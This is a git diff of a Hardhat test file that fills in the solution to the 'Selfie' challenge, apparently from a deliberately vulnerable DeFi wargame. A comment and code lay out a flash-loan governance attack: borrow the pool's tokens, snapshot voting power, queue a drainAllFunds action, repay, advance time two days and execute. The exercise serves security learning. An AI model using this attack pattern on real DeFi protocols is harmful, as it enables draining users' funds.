@@ -29,8 +29,25 @@ describe('[Challenge] Selfie', function () {
         ).to.be.equal(TOKENS_IN_POOL);
     });
 
+    /**
+     * Goal: Drain all the DVT token in the pool.
+     * Bug: The governance do not set enough check on proposing action.
+     * Exploit: flash loan all the DVT in the pool, trigger a snapshot, 
+     * propose an action which is calling drainAllFunds on the pool, 
+     * repay the flashloan, wait 2 days, and call executeAction.
+     */
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const receiverFactory = await ethers.getContractFactory('SelfieEvilReceiver', attacker);
+        this.evilReceiver = await receiverFactory.deploy(this.governance.address, this.pool.address);
+        await this.evilReceiver.deployed();
+        
+        // Start exploit
+        await this.evilReceiver.connect(attacker).exeFlashloan(TOKENS_IN_POOL);
+
+        // Advance time 2 days so that we can execute the action
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        await this.evilReceiver.executeAction();
     });
 
     after(async function () {
